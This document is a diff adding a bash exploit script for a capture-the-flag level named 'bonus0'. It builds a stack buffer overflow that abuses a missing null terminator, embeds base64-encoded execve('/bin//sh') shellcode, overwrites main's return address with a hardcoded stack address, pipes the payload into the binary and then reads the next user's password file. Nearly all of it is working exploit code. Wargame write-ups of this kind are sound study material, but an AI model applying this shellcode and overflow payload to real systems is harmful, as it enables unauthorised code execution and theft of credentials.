@@ -1,0 +1,57 @@
+# Helper function, "put n s" print the string 's' n times
+put() { printf "$2%.0s" $(seq 1 "$1"); }
+
+# Helper function, "hex 41424344" gives "ABCD"
+hex() { echo "$1" | xxd -p -r; }
+
+# Helper function, "hex_little_endian 41424344" gives "DBCA"
+hex_little_endian() { hex $(printf "$1" | rev | fold -b2 | rev | tr -d '\n') ; }
+
+# Helper function, "compute '16 - 4'" gives "12"
+compute() { echo "$1" | bc | tr -d '\n' ; }
+
+# We input 20 bytes as pp_buffer1, then 19 bytes as pp_buffer2
+# Due to an implementation error, pp_buffer1 is not null-terminated
+# String operation on pp_buffer1 will work as if it's the string (pp_buffer1 + pp_buffer2)
+# The resulting buffer in main will be (pp_buffer1 + pp_buffer2 + pp_buffer2)
+# We use this as a stack buffer overflow to overwrite the return address of main
+# We jmp to our 23-bytes shellcode written in (pp_buffer1 + pp_buffer2)
+
+# Shellcode without '\n' or '\0' that executes 'execve("/bin//sh", NULL, NULL)'
+SHELLCODE_BASE64="McBQBAtoLy9zaGgvYmluieMxyTHSzYA="
+SHELLCODE="$(echo ${SHELLCODE_BASE64} | base64 --decode)"
+SHELLCODE_SIZE=$(printf "${SHELLCODE}" | wc -c)
+
+# We set the first buffer to the 20 first bytes of the shellcode
+PP_BUFFER1="${SHELLCODE:0:20}"
+
+# We set the second buffer to:
+# Shellcode last 3 bytes + 11 'A' + Shellcode address (4 bytes) + 1 'A'
+MAIN_BUFFER_SIZE=42
+MAIN_CALLING_ALIGNMENT_SIZE=8
+MAIN_EBP_SAVED_SIZE=4
+MAIN_RETURN_ADDRESS_OFFSET_TO_BUFFER="$(compute "${MAIN_BUFFER_SIZE} + ${MAIN_CALLING_ALIGNMENT_SIZE} + ${MAIN_EBP_SAVED_SIZE}")"
+PP_BUFFER1_SIZE=20
+PP_BUFFER2_FILLER_SIZE="$(compute "(${MAIN_RETURN_ADDRESS_OFFSET_TO_BUFFER} - ${PP_BUFFER1_SIZE} - 3 - 4 - 1 - 1 - 3) / 2")"
+PP_BUFFER2_FILLER="$(put "${PP_BUFFER2_FILLER_SIZE}" "A")"
+
+MAIN_BUFFER_ADDRESS="bffff736"
+SHELLCODE_ADDRESS="${MAIN_BUFFER_ADDRESS}"
+RETURN_ADDRESS_REPLACEMENT="$(hex_little_endian "${SHELLCODE_ADDRESS}")"
+PP_BUFFER2="${SHELLCODE:20:3}${PP_BUFFER2_FILLER}${RETURN_ADDRESS_REPLACEMENT}A"
+
+# The final buffer will look like this:
+# Shellcode (23 bytes) + 31 bytes + Shellcode address (4 bytes) + 1 byte
+# Detailing the 31 bytes:
+#   16 bytes from the first pp_buffer2:
+#       11 'A' + Shellcode address (4 bytes) + 1 'A'
+#   1 byte from the program concatenation:
+#       1 ' '
+#   14 bytes from the second pp_buffer2:
+#       Shellcode 3 last bytes + 11 'A'
+
+# We print our exploit to the input and wait for the reverse shell to open with cat
+(echo "${PP_BUFFER1}" && sleep 1 && echo "${PP_BUFFER2}" && cat) | ./bonus0
+
+# We use the reverse shell to retrieve the password
+$ cat /home/user/bonus1/.pass
